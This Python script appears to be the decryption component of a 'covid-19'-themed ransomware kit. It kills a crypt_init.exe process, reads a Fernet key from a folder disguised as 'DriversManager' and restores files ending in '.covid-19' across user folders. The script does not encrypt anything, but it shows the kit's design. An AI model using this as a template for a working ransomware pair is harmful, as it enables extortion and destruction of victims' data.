#!/usr/bin/python
#coding:utf-8
from cryptography.fernet import Fernet
import os, ctypes, sys

# GET THE ENVIRONMENT VARIABLES
letter_drive = os.environ["SystemDrive"]
current_user = os.environ["USERNAME"]

# FUNCTION TO STOP CRYPT INIT
def kill_init():
    try:
        cmd = "taskkill /IM crypt_init.exe /f"
        os.system(cmd)
    except:
        pass
kill_init()

# DEFINE PATH TO LOCATE AND READ THE KEY
path = "{}\\Users\\{}\\AppData\\Roaming\\DriversManager\\convert.key".format(letter_drive, current_user)
file = open(path,"rb")
key = file.read()
file.close()

# DEFINE THE DIRECTORY TO DECRYPT FILES
def filelist():
    mylist_src = []
    source_dir = ["\\Users\\"]
    for element in source_dir:
        for root, dirs, files in os.walk(element):
            for file in files:
                if file.endswith(".covid-19"):
                    mylist_src.append(os.path.join(root, file))
        return mylist_src

# FUNCTION TO DECRYPT FILES
def file_decrypt(key, files):
    for name in files:
        with open(name, 'rb') as f:
            data = f.read()

        fernet = Fernet(key)
        decrypted = fernet.decrypt(data)
        decrypted_file = name.replace('.covid-19', '')
        try:
            with open(decrypted_file, 'wb') as f:
                f.write(decrypted)
                os.remove(name)
        except:
            continue

# MAIN CODE
file_decrypt(key, filelist())
